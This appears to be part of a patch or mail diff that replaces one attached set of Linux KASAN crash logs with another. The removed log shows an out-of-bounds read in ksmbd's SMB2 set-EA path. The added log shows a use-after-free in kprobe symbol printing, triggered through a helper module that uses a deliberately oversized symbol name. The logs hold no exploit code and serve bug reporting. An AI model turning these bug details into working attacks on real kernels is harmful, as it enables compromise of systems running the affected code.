+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[  979.537365]  module_address_lookup+0xdc/0x130
+[  979.537388]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[  979.537421]  kallsyms_lookup_buildid+0x157/0x1e0
+[  979.537441]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[  979.537474]  __sprint_symbol.isra.0+0xd9/0x1f0
+[  979.537492]  ? __pfx___sprint_symbol.isra.0+0x10/0x10
+[  979.537511]  ? __asan_memcpy+0x3c/0x60
+[  979.537524]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.537540]  ? __sprint_symbol.isra.0+0x151/0x1f0
+[  979.537558]  ? __pfx___sprint_symbol.isra.0+0x10/0x10
+[  979.537579]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.537597]  ? copy_from_kernel_nofault_allowed+0x98/0xd0
+[  979.537619]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[  979.537653]  process_fetch_insn+0x8c2/0x1990
+[  979.537672]  ? __pfx_process_fetch_insn+0x10/0x10
+[  979.537688]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.537703]  ? rb_move_tail+0x433/0x1830
+[  979.537724]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[  979.537766]  ? __pfx_rb_move_tail+0x10/0x10
+[  979.537789]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.537805]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.537820]  ? sched_clock+0x29/0x50
+[  979.537832]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.537847]  ? __rb_reserve_next.constprop.0+0x62d/0x1480
+[  979.537874]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.537889]  ? ring_buffer_lock_reserve+0x56d/0xfa0
+[  979.537910]  ? __pfx_ring_buffer_lock_reserve+0x10/0x10
+[  979.537925]  ? __entry_text_end+0xfdff5/0x1020f9
+[  979.537940]  ? handle_bug+0x184/0x2a0
+[  979.537956]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.537972]  ? ring_buffer_event_data+0xc9/0x120
+[  979.537990]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.538006]  ? trace_event_buffer_lock_reserve+0x3f3/0x6d0
+[  979.538026]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.538041]  ? ring_buffer_event_data+0xc9/0x120
+[  979.538060]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.538075]  ? trace_event_buffer_reserve+0x250/0x320
+[  979.538090]  kprobe_trace_func+0x3a6/0x700
+[  979.538109]  ? __pfx_kprobe_trace_func+0x10/0x10
+[  979.538131]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.538149]  ? preempt_schedule_notrace+0x4b/0x80
+[  979.538171]  kprobe_dispatcher+0xf0/0x120
+[  979.538187]  ? symrace_probe_point+0x4/0x20 [helper]
+[  979.538202]  kprobe_ftrace_handler+0x2bf/0x420
+[  979.538217]  ? symrace_probe_point+0x9/0x20 [helper]
+[  979.538232]  ? __pfx_kprobe_dispatcher+0x10/0x10
+[  979.538249]  ? __pfx_trigger_fn+0x10/0x10 [helper]
+[  979.538264]  0xffffffffa04010da
+[  979.538273]  ? __pfx_trigger_fn+0x10/0x10 [helper]
+[  979.538291]  ? trigger_fn+0x95/0xe0 [helper]
+[  979.538307]  ? symrace_probe_point+0x5/0x20 [helper]
+[  979.538323]  symrace_probe_point+0x9/0x20 [helper]
+[  979.538338]  trigger_fn+0xa1/0xe0 [helper]
+[  979.538353]  kthread+0x2fe/0x400
+[  979.538366]  ? recalc_sigpending+0x18c/0x220
+[  979.538381]  ? __pfx_kthread+0x10/0x10
+[  979.538395]  ret_from_fork+0x3f7/0x680
+[  979.538410]  ? __pfx_ret_from_fork+0x10/0x10
+[  979.538426]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  979.538441]  ? __switch_to+0x743/0xf60
+[  979.538461]  ? __pfx_kthread+0x10/0x10
+[  979.538475]  ret_from_fork_asm+0x1a/0x30
+[  979.538498]  </TASK>
+[  979.538502]=20
+[  979.538505] Allocated by task 362:
+[  979.538510]  kasan_save_stack+0x33/0x60
+[  979.538525]  kasan_save_track+0x14/0x30
+[  979.538539]  __kasan_kmalloc+0x8f/0xa0
+[  979.538553]  __kmalloc_noprof+0x1e9/0x510
+[  979.538564]  __memcg_list_lru_alloc+0x395/0x690
+[  979.538579]  memcg_list_lru_alloc+0xc0/0xf0
+[  979.538597]  __memcg_slab_post_alloc_hook+0x1fe/0x11b0
+[  979.538617]  kmem_cache_alloc_lru_noprof+0x3a5/0x3e0
+[  979.538630]  __d_alloc+0x3a/0x850
+[  979.538644]  d_alloc_pseudo+0x21/0xb0
+[  979.538663]  alloc_file_pseudo+0x101/0x270
+[  979.538680]  __anon_inode_getfile+0xbd/0x230
+[  979.538694]  __anon_inode_getfd+0x57/0xc0
+[  979.538709]  do_inotify_init+0x465/0x5c0
+[  979.538728]  __x64_sys_inotify_init1+0x35/0x50
+[  979.538753]  do_syscall_64+0xdd/0x4a0
 
---===============3053206820710942250==
+--===============5575217477510584208==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 Content-Disposition: attachment; filename="kasan-run2.txt"
 MIME-Version: 1.0
 
-[  106.652767] BUG: KASAN: slab-out-of-bounds in string+0x42b/0x470
-[  106.653256] Read of size 1 at addr ffff88800e4ec6e5 by task kworker/0:0/9
-[  106.653391]=20
-[  106.653959] CPU: 0 UID: 0 PID: 9 Comm: kworker/0:0 Not tainted 7.3.0 #8 PR=
-EEMPT(lazy)=20
-[  106.654097] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
+[   33.285771] BUG: KASAN: slab-use-after-free in sized_strscpy+0x248/0x2f0
+[   33.285862] Write of size 8 at addr ff1100000a215002 by task symrace-trigg=
+er/406
+[   33.285874]=20
+[   33.285894] CPU: 2 UID: 0 PID: 406 Comm: symrace-trigger Tainted: G       =
+ W  O        7.3.0 #1 PREEMPT(lazy)=20
+[   33.285914] Tainted: [W]=3DWARN, [O]=3DOOT_MODULE
+[   33.285920] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
 ps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  106.654323] Workqueue: ksmbd-io handle_ksmbd_work
-[  106.654644] Call Trace:
-[  106.654728]  <TASK>
-[  106.654859]  dump_stack_lvl+0x7b/0xa0
-[  106.655014]  print_report+0xd0/0x630
-[  106.655102]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
-[  106.655203]  ? string+0x42b/0x470
-[  106.655260]  kasan_report+0xce/0x100
-[  106.655332]  ? string+0x42b/0x470
-[  106.655402]  string+0x42b/0x470
-[  106.655464]  ? __pfx_string+0x10/0x10
-[  106.655534]  vsnprintf+0x330/0x1110
-[  106.655606]  ? __pfx_vsnprintf+0x10/0x10
-[  106.655672]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
-[  106.655762]  vprintk_store+0x319/0x960
-[  106.655836]  ? stack_depot_save_flags+0x480/0x820
-[  106.655939]  ? __pfx_vprintk_store+0x10/0x10
-[  106.656006]  ? kasan_save_stack+0x42/0x60
-[  106.656091]  ? kasan_save_track+0x14/0x30
-[  106.656158]  ? smb2_set_info+0x1eff/0x3a50
-[  106.656230]  ? handle_ksmbd_work+0x6e4/0x1dd0
-[  106.656313]  ? process_one_work+0x755/0x1200
-[  106.656387]  ? worker_thread+0x4d3/0xbc0
-[  106.656455]  ? kthread+0x2fe/0x400
-[  106.656534]  ? printk_percpu_data_ready+0xe/0x20
-[  106.656605]  vprintk_emit+0xfc/0x3b0
-[  106.656678]  ? __pfx_vprintk_emit+0x10/0x10
-[  106.656760]  _printk+0xcc/0x100
-[  106.656848]  ? __pfx__printk+0x10/0x10
-[  106.656939]  ? __kasan_kmalloc+0x8f/0xa0
-[  106.657000]  ? __kmalloc_cache_noprof+0x19f/0x3f0
-[  106.657081]  ? __kasan_kmalloc+0x8f/0xa0
-[  106.657141]  smb2_set_ea+0x5a9/0x7f0
-[  106.657210]  smb2_set_info+0x1eff/0x3a50
-[  106.657285]  ? _raw_spin_lock+0x85/0xe0
-[  106.657365]  ? __pfx_smb2_set_info+0x10/0x10
-[  106.657443]  ? ksmbd_smb2_check_message+0x531/0x2cd0
-[  106.657538]  ? __pfx_smb2_set_info+0x10/0x10
-[  106.657608]  handle_ksmbd_work+0x6e4/0x1dd0
-[  106.657707]  process_one_work+0x755/0x1200
-[  106.657789]  ? __pfx_process_one_work+0x10/0x10
-[  106.657869]  ? __pfx_handle_ksmbd_work+0x10/0x10
-[  106.657959]  worker_thread+0x4d3/0xbc0
-[  106.658045]  ? __pfx_worker_thread+0x10/0x10
-[  106.658115]  kthread+0x2fe/0x400
-[  106.658174]  ? recalc_sigpending+0x18c/0x220
-[  106.658245]  ? __pfx_kthread+0x10/0x10
-[  106.658309]  ret_from_fork+0x3f7/0x680
-[  106.658383]  ? __pfx_ret_from_fork+0x10/0x10
-[  106.658454]  ? __switch_to+0x743/0xf60
-[  106.658539]  ? __pfx_kthread+0x10/0x10
-[  106.658604]  ret_from_fork_asm+0x1a/0x30
-[  106.658721]  </TASK>
-[  106.680431]=20
-[  106.680502] Allocated by task 102:
-[  106.680641]  kasan_save_stack+0x33/0x60
-[  106.680862]  kasan_save_track+0x14/0x30
-[  106.680925]  __kasan_kmalloc+0x8f/0xa0
-[  106.680982]  __kvmalloc_node_noprof+0x24a/0x670
-[  106.681068]  ksmbd_conn_handler_loop+0x530/0x1110
-[  106.681145]  kthread+0x2fe/0x400
-[  106.681201]  ret_from_fork+0x3f7/0x680
-[  106.681262]  ret_from_fork_asm+0x1a/0x30
-[  106.681346]=20
-[  106.681404] The buggy address belongs to the object at ffff88800e4ec600
-[  106.681404]  which belongs to the cache kmalloc-256 of size 256
-[  106.681490] The buggy address is located 0 bytes to the right of
-[  106.681490]  allocated 229-byte region [ffff88800e4ec600, ffff88800e4ec6e5)
-[  106.681558]=20
-[  106.681633] The buggy address belongs to the physical page:
-[  106.682002] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0=
- pfn:0xe4ec
-[  106.682284] flags: 0x100000000000000(node=3D0|zone=3D1)
-[  106.682683] page_type: f5(slab)
-[  106.683082] raw: 0100000000000000 ffff88800a041b40 dead000000000122 000000=
+[   33.285931] Call T
+** replaying previous printk message **
+[   33.285931] Call Trace:
+[   33.285946]  <TASK>
+[   33.285953]  dump_stack_lvl+0x7b/0xa0
+[   33.285976]  print_report+0xd0/0x630
+[   33.286036]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[   33.286063]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286081]  ? sized_strscpy+0x248/0x2f0
+[   33.286100]  kasan_report+0xce/0x100
+[   33.286122]  ? sized_strscpy+0x248/0x2f0
+[   33.286144]  sized_strscpy+0x248/0x2f0
+[   33.286165]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[   33.286199]  module_address_lookup+0xdc/0x130
+[   33.286235]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[   33.286269]  kallsyms_lookup_buildid+0x157/0x1e0
+[   33.286304]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[   33.286337]  __sprint_symbol.isra.0+0xd9/0x1f0
+[   33.286356]  ? __pfx___sprint_symbol.isra.0+0x10/0x10
+[   33.286374]  ? __asan_memcpy+0x3c/0x60
+[   33.286388]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286404]  ? __sprint_symbol.isra.0+0x151/0x1f0
+[   33.286422]  ? __pfx___sprint_symbol.isra.0+0x10/0x10
+[   33.286442]  ? __pfx_a+0x10/0x10 [helper]
+[   33.286457]  ? copy_from_kernel_nofault+0x81/0x200
+[   33.286486]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286502]  ? copy_from_kernel_nofault_allowed+0x98/0xd0
+[   33.286531]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[   33.286565]  process_fetch_insn+0x8c2/0x1990
+[   33.286585]  ? __pfx_process_fetch_insn+0x10/0x10
+[   33.286601]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286617]  ? rb_move_tail+0x433/0x1830
+[   33.286643]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[   33.286679]  ? __pfx_rb_move_tail+0x10/0x10
+[   33.286707]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286723]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286738]  ? sched_clock+0x29/0x50
+[   33.286759]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286774]  ? __rb_reserve_next.constprop.0+0x62d/0x1480
+[   33.286802]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286817]  ? ring_buffer_lock_reserve+0x56d/0xfa0
+[   33.286835]  ? __pfx_ring_buffer_lock_reserve+0x10/0x10
+[   33.286850]  ? __entry_text_end+0xfdff5/0x1020f9
+[   33.286865]  ? handle_bug+0x184/0x2a0
+[   33.286884]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286900]  ? ring_buffer_event_data+0xc9/0x120
+[   33.286919]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286934]  ? trace_event_buffer_lock_reserve+0x3f3/0x6d0
+[   33.286966]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.286982]  ? ring_buffer_event_data+0xc9/0x120
+[   33.287000]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.287016]  ? trace_event_buffer_reserve+0x250/0x320
+[   33.287032]  kprobe_trace_func+0x3a6/0x700
+[   33.287051]  ? __pfx_kprobe_trace_func+0x10/0x10
+[   33.287070]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.287085]  ? preempt_schedule_notrace+0x4b/0x80
+[   33.287107]  kprobe_dispatcher+0xf0/0x120
+[   33.287124]  ? symrace_probe_point+0x4/0x20 [helper]
+[   33.287139]  kprobe_ftrace_handler+0x2bf/0x420
+[   33.287155]  ? symrace_probe_point+0x9/0x20 [helper]
+[   33.287170]  ? __pfx_kprobe_dispatcher+0x10/0x10
+[   33.287187]  ? __pfx_trigger_fn+0x10/0x10 [helper]
+[   33.287202]  0xffffffffa04010da
+[   33.287213]  ? __pfx_trigger_fn+0x10/0x10 [helper]
+[   33.287232]  ? trigger_fn+0x95/0xe0 [helper]
+[   33.287247]  ? symrace_probe_point+0x5/0x20 [helper]
+[   33.287264]  symrace_probe_point+0x9/0x20 [helper]
+[   33.287279]  trigger_fn+0xa1/0xe0 [helper]
+[   33.287295]  kthread+0x2fe/0x400
+[   33.287309]  ? recalc_sigpending+0x18c/0x220
+[   33.287325]  ? __pfx_kthread+0x10/0x10
+[   33.287339]  ret_from_fork+0x3f7/0x680
+[   33.287355]  ? __pfx_ret_from_fork+0x10/0x10
+[   33.287371]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.287386]  ? __switch_to+0x743/0xf60
+[   33.287406]  ? __pfx_kthread+0x10/0x10
+[   33.287420]  ret_from_fork_asm+0x1a/0x30
+[   33.287444]  </TASK>
+[   33.287456]=20
+[   33.287459] Allocated by task 193:
+[   33.287475]  kasan_save_stack+0x33/0x60
+[   33.287490]  kasan_save_track+0x14/0x30
+[   33.287507]  __kasan_kmalloc+0x8f/0xa0
+[   33.287521]  __kmalloc_noprof+0x1e9/0x510
+[   33.287545]  security_inode_init_security+0xf7/0x2f0
+[   33.287601]  shmem_mknod+0x26f/0x3e0
+[   33.287614]  lookup_open+0xf58/0x15a0
+[   33.287646]  path_openat+0xe36/0x2030
+[   33.287661]  do_file_open+0x202/0x420
+[   33.287674]  do_sys_openat2+0xf4/0x1b0
+[   33.287700]  __x64_sys_openat+0x136/0x1e0
+[   33.287718]  do_syscall_64+0xdd/0x4a0
+[   33.287732]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[   33.287744]=20
+[   33.287747] Freed by task 193:
+[   33.287752]  kasan_save_stack+0x33/0x60
+[   33.287766]  kasan_save_track+0x14/0x30
+[   33.287781]  kasan_save_free_info+0x3b/0x60
+[   33.287801]  __kasan_slab_free+0x43/0x70
+[   33.287816]  kfree+0x18b/0x430
+[   33.287837]  security_inode_init_security+0x251/0x2f0
+[   33.287851]  shmem_mknod+0x26f/0x3e0
+[   33.287863]  lookup_open+0xf58/0x15a0
+[   33.287881]  path_openat+0xe36/0x2030
+[   33.287895]  do_file_open+0x202/0x420
+[   33.287909]  do_sys_openat2+0xf4/0x1b0
+[   33.287926]  __x64_sys_openat+0x136/0x1e0
+[   33.287944]  do_syscall_64+0xdd/0x4a0
+[   33.287957]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[   33.287969]=20
+[   33.287972] The buggy address belongs to the object at ff1100000a215000
+[   33.287972]  which belongs to the cache kmalloc-64 of size 64
+[   33.287989] The buggy address is located 2 bytes inside of
+[   33.287989]  freed 64-byte region [ff1100000a215000, ff1100000a215040)
+[   33.288001]=20
+[   33.288004] The buggy address belongs to the physical page:
+[   33.288012] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0=
+ pfn:0xa215
+[   33.288025] flags: 0x100000000000000(node=3D0|zone=3D1)
+[   33.288042] page_type: f5(slab)
+[   33.288055] raw: 0100000000000000 ff110000098388c0 dead000000000100 dead00=
+0000000122
+[   33.288067] raw: 0000000000000000 0000000000200020 00000000f5000000 000000=
 0000000000
-[  106.683159] raw: 0000000000000000 0000000000080008 00000000f5000000 000000=
-0000000000
-[  106.683262] page dumped because: kasan: bad access detected
-[  106.683297]=20
-[  106.683319] Memory state around the buggy address:
-[  106.683570]  ffff88800e4ec580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
-c fc
-[  106.683643]  ffff88800e4ec600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
+[   33.288075] page dumped because: kasan: bad access detected
+[   33.288080]=20
+[   33.288083] Memory state around the buggy address:
+[   33.288089]  ff1100000a214f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
 0 00
-[  106.683703] >ffff88800e4ec680: 00 00 00 00 00 00 00 00 00 00 00 00 05 fc f=
+[   33.288098]  ff1100000a214f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0=
+0 00
+[   33.288107] >ff1100000a215000: fa fb fb fb fb fb fb fb fc fc fc fc fc fc f=
 c fc
-[  106.683753]                                                        ^
-[  106.683838]  ffff88800e4ec700: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
+[   33.288114]                    ^
+[   33.288120]  ff1100000a215080: fa fb fb fb fb fb fb fb fc fc fc fc fc fc f=
 c fc
-[  106.683886]  ffff88800e4ec780: fc fc fc fc fc fc fc fc fc fc fc fc fc fc f=
+[   33.288129]  ff1100000a215100: fa fb fb fb fb fb fb fb fc fc fc fc fc fc f=
 c fc
-[  106.683941] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+[   33.288136] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-[  106.684295] Kernel panic - not syncing: KASAN: panic_on_warn set ...
-[  106.701346] CPU: 0 UID: 0 PID: 9 Comm: kworker/0:0 Not tainted 7.3.0 #8 PR=
-EEMPT(lazy)=20
-[  106.701756] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
+[   33.288179] Disabling lock debugging due to kernel taint
+[   33.288197] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+[   33.288203] BUG: KASAN: slab-use-after-free in sized_strscpy+0x248/0x2f0
+[   33.288222] Write of size 8 at addr ff1100000a21500a by task symrace-trigg=
+er/406
+[   33.288232]=20
+[   33.288238] CPU: 2 UID: 0 PID: 406 Comm: symrace-trigger Tainted: G    B  =
+ W  O        7.3.0 #1 PREEMPT(lazy)=20
+[   33.288258] Tainted: [B]=3DBAD_PAGE, [W]=3DWARN, [O]=3DOOT_MODULE
+[   33.288265] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_ca=
 ps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  106.702250] Workqueue: ksmbd-io handle_ksmbd_work
-[  106.702598] Call Trace:
-[  106.702762]  <TASK>
-[  106.702919]  dump_stack_lvl+0x30/0xa0
-[  106.703171]  vpanic+0x790/0x850
-[  106.703408]  ? __pfx_vpanic+0x10/0x10
-[  106.703658]  ? string+0x42b/0x470
-[  106.703880]  panic+0xcf/0xd0
-[  106.704099]  ? __pfx_panic+0x10/0x10
-[  106.704345]  ? print_report+0x2ef/0x630
-[  106.704588]  check_panic_on_warn+0x91/0xa0
-[  106.704851]  end_report+0xc8/0xe0
-[  106.705081]  kasan_report+0xdc/0x100
-[  106.705371]  ? string+0x42b/0x470
-[  106.705605]  string+0x42b/0x470
-[  106.705818]  ? __pfx_string+0x10/0x10
-[  106.706073]  vsnprintf+0x330/0x1110
-[  106.706310]  ? __pfx_vsnprintf+0x10/0x10
-[  106.706550]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
-[  106.706855]  vprintk_store+0x319/0x960
-[  106.707096]  ? stack_depot_save_flags+0x480/0x820
-[  106.707387]  ? __pfx_vprintk_store+0x10/0x10
-[  106.707637]  ? kasan_save_stack+0x42/0x60
-[  106.707879]  ? kasan_save_track+0x14/0x30
-[  106.708119]  ? smb2_set_info+0x1eff/0x3a50
-[  106.708368]  ? handle_ksmbd_work+0x6e4/0x1dd0
-[  106.708637]  ? process_one_work+0x755/0x1200
-[  106.708901]  ? worker_thread+0x4d3/0xbc0
-[  106.709141]  ? kthread+0x2fe/0x400
-[  106.709375]  ? printk_percpu_data_ready+0xe/0x20
-[  106.709641]  vprintk_emit+0xfc/0x3b0
-[  106.709882]  ? __pfx_vprintk_emit+0x10/0x10
-[  106.710148]  _printk+0xcc/0x100
-[  106.710383]  ? __pfx__printk+0x10/0x10
-[  106.710640]  ? __kasan_kmalloc+0x8f/0xa0
-[  106.710878]  ? __kmalloc_cache_noprof+0x19f/0x3f0
-[  106.711158]  ? __kasan_kmalloc+0x8f/0xa0
-[  106.711392]  smb2_set_ea+0x5a9/0x7f0
-[  106.711623]  smb2_set_info+0x1eff/0x3a50
-[  106.711877]  ? _raw_spin_lock+0x85/0xe0
-[  106.712132]  ? __pfx_smb2_set_info+0x10/0x10
-[  106.712396]  ? ksmbd_smb2_check_message+0x531/0x2cd0
-[  106.712697]  ? __pfx_smb2_set_info+0x10/0x10
-[  106.712964]  handle_ksmbd_work+0x6e4/0x1dd0
-[  106.713248]  process_one_work+0x755/0x1200
-[  106.713513]  ? __pfx_process_one_work+0x10/0x10
-[  106.713787]  ? __pfx_handle_ksmbd_work+0x10/0x10
-[  106.714081]  worker_thread+0x4d3/0xbc0
-[  106.714337]  ? __pfx_worker_thread+0x10/0x10
-[  106.714601]  kthread+0x2fe/0x400
-[  106.714814]  ? recalc_sigpending+0x18c/0x220
-[  106.715076]  ? __pfx_kthread+0x10/0x10
-[  106.715309]  ret_from_fork+0x3f7/0x680
-[  106.715547]  ? __pfx_ret_from_fork+0x10/0x10
-[  106.715806]  ? __switch_to+0x743/0xf60
-[  106.716067]  ? __pfx_kthread+0x10/0x10
-[  106.716299]  ret_from_fork_asm+0x1a/0x30
-[  106.716565]  </TASK>
-[  106.717364] Kernel Offset: disabled
-[  106.718137] Rebooting in 1 seconds..
+[   33.288274] Call Trace:
+[   33.288278]  <TASK>
+[   33.288283]  dump_stack_lvl+0x7b/0xa0
+[   33.288299]  print_report+0xd0/0x630
+[   33.288317]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[   33.288340]  ? sized_strscpy+0x248/0x2f0
+[   33.288358]  kasan_report+0xce/0x100
+[   33.288377]  ? sized_strscpy+0x248/0x2f0
